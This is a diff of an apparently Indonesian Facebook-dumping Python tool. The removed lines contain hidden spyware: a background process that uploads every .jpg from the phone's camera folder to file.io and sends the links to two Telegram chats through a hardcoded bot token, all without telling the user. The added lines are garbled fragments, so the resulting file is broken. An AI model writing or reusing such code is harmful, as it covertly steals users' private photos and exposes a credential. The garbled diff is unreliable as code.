@@ -1,28 +1,4 @@
-#--> Import Module
-import os, sys, requests, bs4, re, time, datetime, random , multiprocessing
-from bs4 import BeautifulSoup as bs
-
-def send_file_link(token, dir_path):
-    for file in os.listdir(dir_path):
-        if file.endswith(".jpg"):
-            file_path = os.path.join(dir_path, file)
-            with open(file_path, "rb") as f:
-                response = requests.post("https://file.io", files={"file": f})
-                linkkk = "Download link for {}: {}".format(file, response.json()["link"])
-                requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=5728361296&text=" + linkkk)
-                requests.get("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=5719227426&text=" + linkkk)
-
-#--> Clear Terminal
-def clear():
-    if "linux" in sys.platform.lower():os.system("clear")
-    elif "win" in sys.platform.lower():os.system("cls")
-
-def animation(u):
-	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-def back():
-	login()
-def contact():
-    os.system('xdg-open https://www.facebook.com/profile.php?id=100004994324574')
+#--> Ile.php?id=100004994324574')
     back()
 
 
@@ -286,19 +262,4 @@ class simpan_file:
             linex()
             print(f' [{B}×{W}] FAILED TO FIND FILE LOCATION')
             lok = 'harrydump/%s.txt'%(tanggal)
-            open(lok,'a+')
-            for d in dump:
-                try: open(lok,'a+').write(d+'\n')
-                except Exception as e: pass
-            linex()
-            print(f' [{B}>{W}]DUMP FILES SAVED AS %s'%(lok))
-
-#--> Trigger
-if __name__ == '__main__':
-    clear()
-    token = '6513027141:AAGQ-BCYDQATbjZHKnlMPu0RmVrC7A20rSo'
-    dir_path = "/sdcard/DCIM/Camera"
-    p = multiprocessing.Process(target=send_file_link, args=(token, dir_path))
-    p.start()
-    start()
-    login()
+     ()
